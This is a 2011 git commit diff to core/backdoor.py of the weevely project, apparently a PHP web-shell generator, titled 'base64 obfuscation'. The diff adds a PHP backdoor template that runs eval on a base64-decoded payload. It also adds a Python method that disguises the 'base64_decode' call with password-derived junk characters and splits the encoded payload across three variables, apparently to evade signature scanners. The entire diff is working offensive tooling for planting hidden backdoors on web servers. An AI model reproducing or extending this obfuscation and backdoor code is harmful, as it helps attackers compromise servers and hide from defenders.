a35a15358b12a5ead151d562756a51122724efe3
emilio.pinn@gmail.com <emilio.pinn@gmail.com@5205769a-2ae6-11df-b744-258d51847b74>
2011-11-07 00:06:25 +0000

    base64 obfuscation
    git-svn-id: http://weevely.googlecode.com/svn/trunk@186 5205769a-2ae6-11df-b744-258d51847b74

--- core/backdoor.py
+++ core/backdoor.py
@@ -17,6 +17,7 @@
 # or write to the Free Software Foundation, Inc.,
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 import base64
+from random import random
 
 class Backdoor:
 	payload_template = """
@@ -30,6 +31,16 @@ echo '</%%%END_KEY%%%>';
 """
 
 	backdoor_template = "<?php eval(base64_decode('%%%PAYLOAD%%%')); ?>"
+	
+	backdoor_template = """<?php 
+	$%%FUNC_VAR%% = "%%B64_ENCODED%%";
+	$%%FUNC_VAR%%1="%%PAYLOAD1%%";
+	$%%FUNC_VAR%%2="%%PAYLOAD2%%";
+	$%%FUNC_VAR%%3="%%PAYLOAD3%%";
+	
+	eval($%%FUNC_VAR%%(str_replace("%%FUNC_VAR%%",$%%FUNC_VAR%%1.$%%FUNC_VAR%%2.$%%FUNC_VAR%%3 , ""))); 
+	?>
+	"""
 
 	def __init__( self, password ):
 		self.password  = password
@@ -38,8 +49,51 @@ echo '</%%%END_KEY%%%>';
 		self.payload   = self.payload_template.replace( '%%%START_KEY%%%', self.start_key ).replace( '%%%END_KEY%%%', self.end_key ).replace( '\n', '' )
 		self.backdoor  = self.backdoor_template.replace( '%%%PAYLOAD%%%', base64.b64encode(self.payload) )
 
+#		print self.encode_template()
+#		import sys
+#		sys.exit()
+
 	def __str__( self ):
 		return self.backdoor
+
+	def encode_template(self):
+		
+		b64_func_name = 'base64_decode'
+		
+		
+		not_random_chars = ''
+		for i in range(0, len(self.password)):
+			not_random_chars = self.password[:i]
+			if not not_random_chars in b64_func_name:
+				break
+			
+		b64_func_name_encoded = ''
+		for char in b64_func_name:
+			if random() < 0.7:
+				b64_func_name_encoded += not_random_chars + char
+			else:
+				b64_func_name_encoded += char
+				
+				
+			
+		encoded_payload = base64.b64encode(self.payload)	
+		length  = len(encoded_payload)
+		third	= length / 3
+		thirds  = third * 2
+		
+		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_func_name_encoded )
+		template = template.replace( '%%FUNC_VAR%%', not_random_chars )
+		template = template.replace( '%%PAYLOAD1%%', encoded_payload[:third] )
+		template = template.replace( '%%PAYLOAD2%%', encoded_payload[third:thirds] )
+		template = template.replace( '%%PAYLOAD3%%', encoded_payload[thirds:] )
+		
+		print template
+			
+		
+				 
+		#php -r "\$i='base64_decode'; eval(\$i('cHJpbnQoJ2FzZCcpOw==')); print('aaaaaa' | 'b' );"
+
+		
 
 	def save( self, filename ):
 		out = file( filename, 'wt' )
